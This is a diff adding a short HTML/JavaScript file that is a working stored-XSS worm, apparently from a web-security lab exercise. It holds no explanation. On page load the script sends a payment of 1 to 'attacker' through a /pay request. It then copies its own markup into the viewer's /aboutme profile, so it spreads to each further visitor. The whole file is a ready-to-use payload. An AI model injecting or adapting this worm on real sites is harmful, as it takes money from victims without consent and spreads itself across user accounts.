@@ -1,0 +1,10 @@
+<div id="worm">
+<script>
+    let xmlHttp = new XMLHttpRequest();
+    xmlHttp.open("POST", "/pay");
+    xmlHttp.send("recipient=attacker&amount=1");
+    let add_content = new XMLHttpRequest();
+    add_content.open("POST","/aboutme");
+    add_content.send("aboutme=" + encodeURIComponent(document.getElementById("worm").innerHTML));
+</script>
+</div>
